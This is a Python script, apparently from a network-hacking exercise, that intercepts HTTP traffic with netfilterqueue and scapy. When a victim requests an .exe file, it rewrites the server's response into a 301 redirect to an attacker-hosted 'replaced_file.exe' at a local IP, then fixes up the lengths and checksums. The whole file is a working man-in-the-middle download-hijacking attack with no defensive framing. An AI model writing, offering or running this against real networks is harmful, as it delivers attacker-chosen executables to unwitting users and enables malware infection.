#!/usr/bin/python
import netfilterqueue
import scapy.all as scapy

ack_list = []

def process_packet(packet):
    scapy_packets = scapy.IP(packet.get_payload())
    if scapy_packets.haslayer(scapy.Raw):
        if scapy_packets[scapy.TCP].dport == 80:
            if b".exe" in scapy_packets[scapy.Raw].load:
                ack_list.append(scapy_packets[scapy.TCP].ack)
                print("EXE request")
        elif scapy_packets[scapy.TCP].sport == 80:
            if scapy_packets[scapy.TCP].seq in ack_list:
                print("[+] Replacing files....")
                ack_list.remove(scapy_packets[scapy.TCP].seq)
                scapy_packets[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.221.139/replaced_file.exe\n\n"
                del scapy_packets[scapy.IP].len
                del scapy_packets[scapy.IP].chksum
                del scapy_packets[scapy.TCP].chksum

                packet.set_payload(bytes(scapy_packets))
                print(scapy_packets.show())

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
